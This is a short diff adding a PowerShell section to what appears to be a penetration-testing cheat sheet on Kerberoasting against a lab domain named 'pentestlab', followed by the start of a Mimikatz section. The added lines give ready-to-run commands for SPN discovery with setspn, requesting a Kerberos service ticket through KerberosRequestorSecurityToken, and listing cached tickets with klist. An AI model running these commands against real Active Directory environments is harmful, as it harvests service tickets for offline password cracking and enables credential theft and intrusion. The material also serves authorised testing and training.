@@ -1,3 +1,18 @@
+# PowerShell
+
+**SPN Discovery**
+```
+setspn -T pentestlab -Q */*
+```
+**Service Ticket Request**
+```
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "PENTESTLAB_001/WIN-PTELU2U07KG.PENTESTLAB.LOCAL:80"
+```
+**List Available Tickets**
+```
+klist
+```
 # Mimikatz
 
 **Service Ticket Request**
